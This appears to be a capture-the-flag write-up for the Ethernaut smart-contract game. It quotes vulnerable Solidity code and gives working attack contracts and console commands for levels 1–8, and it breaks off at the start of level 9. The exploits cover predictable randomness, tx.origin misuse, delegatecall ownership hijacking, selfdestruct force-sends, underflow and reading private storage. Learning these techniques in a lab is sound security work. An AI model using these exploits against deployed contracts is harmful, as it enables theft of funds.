# Ethernaut CTF

# 1. [Challenge 1 : Fallback](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: \
    1. you claim ownership of the contract \
    2. you reduce its balance to 0

**Solution:** \
Vulnerable Code: 
```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
It's fallback function and here 2 requirements required to make ourself owner

- First we need to contribute some ether to satisfy ```contributions[msg.sender] > 0``` requirements 
- To satisfy 2nd requirements we need send some ether in this fallback function. As fallback function execute when the requested function isn't available. So we can execute ```contract.sendTransaction({"value": 1})``` this to satisfy 2nd requirements and make ourself owner

- To reduce contract balance to 0 we can simply call ```withdraw``` function and able to solve the 1st challenge.


# 2. [Challenge 2: Fallout](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: 
- Claim ownership of the contract below to complete this level.

**Solution:** \
Vulnerable Code: 
```
  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

This constructor function name has a typo. So, to achieve ownership we just need to call ```Fal1out``` function and able to the 2nd challenge


# 3. [Challenge 3: Coin Flip](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: 
- This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

**Solution:** \
Vulnerable Code: 
```
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```

Attack Payload:
```
contract Attack {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(CoinFlip coinFlip) public {

    uint256 guess1 = uint256(blockhash(block.number - 1));
    uint256 guess = uint256(guess1/FACTOR);
    bool _guess = guess == 1 ? true : false;
    coinFlip.flip(_guess);

    }
}
```
We can win this unlimite time by just mimicing the checker functions of `flip` function

# 4. [Challenge 4: Telephone](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

Tasks: 
- Claim ownership of the contract below to complete this level.

**Solution:** \
Vulnerable Code:
```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
```

Attack Payload:
```
contract Attack {
    function attack(Telephone telephone) public {
        telephone.changeOwner(tx.origin);
    }
}
```
This `changeOwner` function is basically checking if `tx.origin` not equally `msg.sender` it will set user inputed address as owner. So we can do is create a smart contract that will call the `changeOwner` function we can satisfy the check and make ourself as owner.


# 5. [Challenge 5: Token](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

Tasks: 
- The goal of this level is for us to hack the basic token contract below. We are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

**Solution:** \
Vulnerable Code:
```
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```
The `transfer` function is taking address whom we want to send token and `value` how much we want send but in 3rd line we can execute `Arithmetic Overflow and Underflow` by submiting 21 (As we have 20 TOKEN) So it will underflow the arithmetic function and add (2^256 - 1) this much token in our wallet



# 6. [Challenge 6: Delegation](https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493)

Tasks: 
- The goal of this level is for you to claim ownership of the instance you are given.

**Solution:** \
Vulnerable Code:
```
  function pwn() public {
    owner = msg.sender;
  }
```
```
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
```

Attack Payload:
```
contract Attack {
    address public delegation;

    constructor(address _delegation) public {
        delegation = _delegation;
    }

    function attack() public {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
}
```
To solve in command line:
```
var functionSignature = web3.utils.sha3("pwn()")
contract.sendTransaction({data: functionSignature})
```

Eve called Attack.attack().
Attack called the `fallback` function of `Delegation` sending the function selector of `pwn()`. `Delegation` forwards the call to `Delegate` using delegatecall.
Here `msg.data` contains the function selector of `pwn()`.
This tells Solidity to call the function `pwn()` inside `Delegate`.
The function `pwn()` updates the owner to `msg.sender`.
Delegatecall runs the code of `Delegate` using the context of `Delegation`.
Therefore `Delegation`'s storage was updated to `msg.sender` where `msg.sender` is the caller of `Delegation`, in this case Attack.


# 7. [Challenge 7: Force](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea)

Tasks:
- Some contracts will simply not take your money ¯\_(ツ)_/¯
- The goal of this level is to make the balance of the contract greater than zero.

**Solution:** \
Vulnerable Code:
Attack Payload:
```
contract Attack {
    Force force;

    constructor(Force _force) public {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
```
To solve the challenge we can simply use `selfdestruct` in our contract and than it will send all the ether to our desire address.


# 8. [Challenge 8: Vault](https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188)

Tasks:
- Unlock the vault to pass the level!

**Solution:** \
Vulnerable Code:
```
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }
```

To solve in command line:
```
await web3.eth.getStorageAt(contract.address, 1)
web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. 



# 9. [Challenge 9: King](https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5)

Tasks:
- The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

- Such a fun game. Your goal is to break it.
- When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
